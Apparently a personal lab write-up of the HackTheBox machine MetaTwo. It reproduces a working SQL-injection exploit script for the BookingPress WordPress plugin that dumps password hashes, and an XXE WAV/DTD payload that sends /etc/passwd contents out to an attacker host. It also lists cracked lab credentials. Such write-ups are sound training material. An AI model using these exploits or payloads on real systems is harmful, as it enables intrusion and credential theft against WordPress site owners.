202303291929
Status: #pgp #john #mediacve #wordpress #XXE #SSRF #decrypt 
Tags: [[Labs]]

# MetaTwo
IP: 10.10.11.186

## Recon

Ports open:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Port 80:

- Nmap scan reveals a redirection to `http://metapress.htb/`
- We manually edit our hosts file to associate the box ip with this domain
- We discover that this is a wordpress site
- After manual enumeration, we discovered a booking functionality and analyzed it further with burp

![[metatwo_booking.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/metatwo_booking.png">

- We began to do research on `bookingpress` and found that bookingpress had multiple vulnerablities
- The vulnerability is: `[CVE-2022-0739] BookingPress < 1.0.11 - Unauthenticated SQL Injection`
- We utilized a script from github that exploited this vulnerability

```python
import requests
from json import loads
from random import randint
from argparse import ArgumentParser

p = ArgumentParser()
p.add_argument('-u', '--url', dest='url', help='URL of wordpress server with vulnerable plugin (http://example.domain)', required=True)
p.add_argument('-n', '--nonce', dest='nonce', help='Nonce that you got as unauthenticated user', required=True)

trigger = ") UNION ALL SELECT @@VERSION,2,3,4,5,6,7,count(*),9 from wp_users-- -"
gainer = ') UNION ALL SELECT user_login,user_email,user_pass,NULL,NULL,NULL,NULL,NULL,NULL from wp_users limit 1 offset {off}-- -'

# Payload: ) AND ... -- - total(9)
def gen_payload(nonce, sqli_postfix, category_id=1):
    return { 
        'action': 'bookingpress_front_get_category_services', # vulnerable action,
        '_wpnonce': nonce,
        'category_id': category_id,
        'total_service': f'{randint(100, 10000)}{sqli_postfix}'
    }

if __name__ == '__main__':  
    print('- BookingPress PoC')
    i = 0
    args = p.parse_args()
    url, nonce = args.url, args.nonce
    pool = requests.session()


    # Check if target is vulnerable
    v_url = f'{url}/wp-admin/admin-ajax.php'
    proof_payload = gen_payload(nonce, trigger)
    
    res = pool.post(v_url, data=proof_payload)
    try:
        res = list(loads(res.text)[0].values())
    except Exception as e:
        print('-- Got junk... Plugin not vulnerable or nonce is incorrect')
        exit(-1)
    cnt = int(res[7])
    
    # Capture hashes
    print('-- Got db fingerprint: ', res[0])
    print('-- Count of users: ', cnt)
    for i in range(cnt):
        try:
            # Generate payload
            user_payload = gen_payload(nonce, gainer.format(off=i))
            u_data = list(loads(pool.post(v_url, user_payload).text)[0].values())
            print(f'|{u_data[0]}|{u_data[1]}|{u_data[2]}|')
        except: continue
```

- All we need to provide is the `url` and the given `wpnonce`

```
python3 booking-press-expl.py -u http://metapress.htb/ -n 96c850e850

- BookingPress PoC
-- Got db fingerprint:  10.5.15-MariaDB-0+deb11u1
-- Count of users:  2
|admin|admin@metapress.htb|$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.|
|manager|manager@metapress.htb|$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70|
```

- This returns the users and their respective password hashes
- After using hashcat, we now have a set of credentials: `manager:partylikearockstar`
- These credentials did not seem to work via ssh, so we use it to authenticate into the Wordpress dashboard
- After manual enumeration, we discover that the version for wordpress is 5.6.2 and that this version has a media upload vulnerability: `WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8`

## Establish Foothold

- With this vulnerability, we can display the contents of sensitive files on the machine
- We can utilize a THM room that shows a step-by-step proof-of-concept
- Here is the Proof of Concept:

```
1. Create a wav file with our payload

echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://10.10.14.7:80/rekt.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav

2. Create a DTD file that will execute code

<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd>"
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.14.7:80/?p=%file;'>" >

3. Start up a python http server

python3 -m http.server

4. Upload the payload.wav file and you will see a request on our http server with base64 encoded data. Decode the data

echo "base64here" | base64 -d
```

![[metatwo_upload.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/metatwo_upload.png">

- We were able to locate the root directory for the website files: `/var/www/metapress.htb/blog`
- This information allows us to fetch the contents of the `wp-config.php` file that can reveal credentials for us

![[metatwo_config.png]]

<img src="https://github.com/charlier0cks/Pentest-Notes/blob/main/Attachments/metatwo_config.png">

- The new credentials found are: `metapress.htb:9NYS_ii@FyL_p5M2NvJ` and `blog:635Aq@TdqrCwXFUZ`
- We were able to use the ftp credentials to authenticate via ftp
- We now had access to the wordpress files. This allowed us to find a php file `send_email.php` which contained credentials for the user `jnelson`: `Cb4_JmWM8zUZWMu@Ys`
- We were able to successfully authenticate via ssh with these new credentials

## Escalate Privileges

- After manual enumeration, we were able to find a hidden directory in `jnelson`'s home directory called `.passpie`
- Inside this directory, we found the private and public pgp keys and a pgp message that looked to be the password for root
- We download the files onto our machine and tried to import the private key using the gpg tool. Unfortunately it asked for a password
- We used john to convert it into a hash that john can crack

```bash
gpg2john keys > hash.txt # You will have to delete the pub key from the file
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

- We were able to crack the password: `blink182`
- Now we imported the private key using gpg and then decrypted the pgp message

```bash
gpg --import keys # We enter the password when prompted
gpg --decrypt root.pass # Make sure to delete any useless information and keep the pgp message only
```

- This now gives us the password for root: `p7qfAZt4_A1xo_0x`
- We use `su root` and enter our new password to get our root shell!




---
# References

- [CVE-2022-0739](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0739)
- Exploit - https://github.com/destr4ct/CVE-2022-0739
- CVE-2021-29447 - https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5
- THM PoC Room (CVE-2021-29447) - https://tryhackme.com/room/wordpresscve202129447
- Decrypting PGP message - https://www.ctfwriteup.com/pentest/tcm-linux-privilege-escalation-course/tryhackme-tomghost-easy